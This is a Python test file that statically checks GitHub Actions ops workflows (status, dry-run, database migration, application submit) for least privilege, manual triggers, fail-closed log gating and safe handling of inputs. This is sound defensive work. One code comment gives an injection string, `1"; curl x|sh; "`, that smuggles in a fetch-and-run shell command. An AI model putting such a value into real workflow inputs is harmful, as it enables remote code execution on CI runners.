"""Static checks over the ops workflows (apply_status, apply_dryrun, db_migrate). They hold
production database credentials or touch real employer forms, so: manual trigger only, least
privilege, inputs never interpolated into shell, never armed, never holding the subscription
token, and identifying output gated on a repo-visibility check that fails closed."""

import os
import re

import yaml

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_WF = os.path.join(_ROOT, ".github", "workflows")
_OPS = ("apply_status.yml", "apply_dryrun.yml", "db_migrate.yml")


def _load(name):
    with open(os.path.join(_WF, name)) as f:
        text = f.read()
    return text, yaml.safe_load(text)


def _triggers(doc):
    # PyYAML (YAML 1.1) parses the bare key `on` as the boolean True.
    return doc.get("on", doc.get(True))


def _run_blocks(doc):
    for job in doc["jobs"].values():
        for step in job["steps"]:
            if "run" in step:
                yield step["run"]


def test_ops_workflows_are_manual_trigger_only():
    for name in _OPS:
        _, doc = _load(name)
        assert set(_triggers(doc)) == {"workflow_dispatch"}, name


def test_ops_workflows_use_read_only_token():
    for name in _OPS:
        _, doc = _load(name)
        assert doc["permissions"] == {"contents": "read"}, name


def test_no_expression_is_interpolated_into_shell():
    # ${{ }} is substituted into the script text before bash parses it; an input like
    # `1"; curl x|sh; "` would execute. Inputs must reach run: blocks only through env.
    for name in _OPS:
        _, doc = _load(name)
        for script in _run_blocks(doc):
            assert "${{" not in script, (name, script)


def _env_keys(node):
    if isinstance(node, dict):
        for key, value in node.items():
            if key == "env" and isinstance(value, dict):
                yield from value.keys()
            yield from _env_keys(value)
    elif isinstance(node, list):
        for item in node:
            yield from _env_keys(item)


def test_ops_workflows_are_never_armed_and_hold_no_subscription_token():
    for name in _OPS:
        text, doc = _load(name)
        assert "APPLY_AGENT_ARMED" not in set(_env_keys(doc)), name
        assert not re.search(r"APPLY_AGENT_ARMED\s*[:=]", text), name
        assert "CLAUDE_CODE_OAUTH_TOKEN" not in text, name


def test_detail_output_is_gated_on_a_fail_closed_visibility_check():
    for name in ("apply_status.yml", "apply_dryrun.yml"):
        text, doc = _load(name)
        assert "REPO_PRIVATE: ${{ steps.visibility.outputs.private }}" in text, name
        steps = [s for job in doc["jobs"].values() for s in job["steps"]]
        check = next(s for s in steps if s.get("id") == "visibility")
        # Anything other than the literal API answer "true" must become false.
        assert 'if [ "$private" != "true" ]; then private=false; fi' in check["run"], name


def test_db_migrate_push_requires_exact_confirmation_and_dryrun_uses_the_guard():
    text, doc = _load("db_migrate.yml")
    steps = {s["name"]: s for s in doc["jobs"]["migrate"]["steps"]}
    push = steps["Push pending migrations"]
    assert push["if"] == "inputs.mode == 'push'"
    assert 'if [ "$CONFIRM" != "push" ]' in push["run"]
    dry = steps["Dry run (rolled back)"]
    assert dry["if"] == "inputs.mode == 'dryrun'"
    assert "scripts/sql_guard.py" in dry["run"]
    assert 'if [ "$before" != "$after" ]' in dry["run"]
    # The guard runs before anything touches the database.
    assert dry["run"].index("sql_guard.py") < dry["run"].index("supabase db query")


def test_db_migrate_pins_the_cli_version():
    _, doc = _load("db_migrate.yml")
    setup = next(s for s in doc["jobs"]["migrate"]["steps"] if s.get("uses", "").startswith("supabase/setup-cli"))
    assert re.fullmatch(r"\d+\.\d+\.\d+", str(setup["with"]["version"]))


def test_preview_log_is_printed_only_when_the_repo_is_private():
    text, doc = _load("apply_agent_preview.yml")
    steps = {s["name"]: s for s in doc["jobs"]["preview"]["steps"]}
    printer = steps["Print log (private repo only)"]
    assert printer["if"] == "always() && steps.visibility.outputs.private == 'true'"
    assert 'if [ "$private" != "true" ]; then private=false; fi' in steps["Check repo visibility"]["run"]


def test_dryrun_ids_are_passed_through_env():
    _, doc = _load("apply_dryrun.yml")
    probe = next(s for s in doc["jobs"]["dryrun"]["steps"] if s["name"] == "Probe application forms")
    assert probe["env"]["JOB_IDS"] == "${{ inputs.job_ids }}"


def test_submit_workflow_passes_the_approval_signing_key_and_only_it_is_armed():
    text, doc = _load("apply_agent_submit.yml")
    step = next(s for s in doc["jobs"]["submit"]["steps"] if s["name"] == "Submit the approved application")
    assert step["env"]["APPROVAL_SIGNING_KEY"] == "${{ secrets.APPROVAL_SIGNING_KEY }}"
    assert step["env"]["APPLY_AGENT_ARMED"] == "1"
    # The preview workflow never needs the key: it can only prepare, never approve or submit.
    preview_text, _ = _load("apply_agent_preview.yml")
    assert "APPROVAL_SIGNING_KEY" not in preview_text


def test_no_workflow_enables_workday_or_takeover():
    # Workday signups and CAPTCHAs need a human at the Beelink's display; a headless Actions runner
    # has nobody to take over, so these stay Beelink-only.
    for path in sorted(os.listdir(_WF)):
        if path.endswith((".yml", ".yaml")):
            with open(os.path.join(_WF, path)) as f:
                text = f.read()
            assert not re.search(r"APPLY_WORKDAY_ENABLED\s*:\s*['\"]?1", text), path
            assert not re.search(r"APPLY_TAKEOVER_ENABLED\s*:\s*['\"]?1", text), path
            # The universal filler fills forms on arbitrary sites; workflow logs are public.
            assert not re.search(r"APPLY_UNIVERSAL_ENABLED\s*:\s*['\"]?1", text), path
            assert "APPLY_UNIVERSAL_PLATFORMS" not in text, path
